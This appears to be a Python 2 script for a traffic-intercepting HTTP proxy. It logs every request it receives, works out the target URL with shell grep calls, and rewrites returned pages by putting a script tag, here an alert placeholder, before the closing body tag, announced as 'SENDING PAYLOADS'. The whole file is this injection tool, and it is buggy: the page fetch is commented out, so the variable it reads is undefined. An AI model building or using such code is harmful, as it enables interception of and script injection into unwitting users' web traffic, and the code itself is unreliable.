#!/usr/bin/python2
import os,sys,time,urllib2,thread,socket

MAX_BYTES = 999999

def main():
    host = '' 
    port = 8080
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host,port))
    s.listen(50)

    while True:
        conn,client = s.accept()
        thread.start_new_thread(threading, (conn,client))

    s.close()
def threading(conn,client):
    try:
        request = conn.recv(MAX_BYTES)
        print(request)
        f = open('log.log','w')
        f.write(request)
        f.close()
        f = open('http.log','a')
        f.write(request)
        f.close()
        userAgent = os.system('cat log.log |grep User-Agent > uAgent.log')
        r = open('uAgent.log','r')
        userAgent = r.read()
        if 'Android' not in userAgent:

            if 'CONNECT' in request:
                http_req = os.system('cat log.log |grep CONNECT > url.log')
                r = open('url.log','r')
                uri = r.read()
                ur = uri.split('CONNECT ',1)[-1]
                url = ur.split('HTTP',1)[0]
           
            elif 'GET' in request:
                http_req = os.system('cat log.log |grep GET >url.log')
                r = open('url.log','r')
                uri = r.read()
                ur = uri.split('GET ', 1)[-1]
                url = ur.split('HTTP', 1)[0]
        
        elif 'Android' in userAgent:
            http_req = os.system('cat log.log |grep Host: > url.log')
            r = open('url.log','r')
            uri = r.read()
            url = uri.split('Host: ',1)[-1]

        if 'http' not in url:
            http = 'http://'
            url = http+url
        elif '443' in url:
           conn.close()
           main()
            # http = 'https://'
          #  url = http+url

        if 'google' in url:
            print('found the url contained google')
            main()

        #page = urllib2.urlopen('http://www.stackoverflow.com')
        print("SENDING PAYLOADS")
        print('THE UIFORM RESOURCE LOCATOR IS !-->', url)
        pay = page.read()
        payload = pay.replace('</body>', '<script>alert("THIS IS THE PAYLOAD")</script></body>')
        conn.send(payload)
        conn.close()
    except KeyboardInterrupt:
        print("keyboard interrupt")
        conn.close()
        r.close()
        exit()


if __name__ == '__main__':
    main()
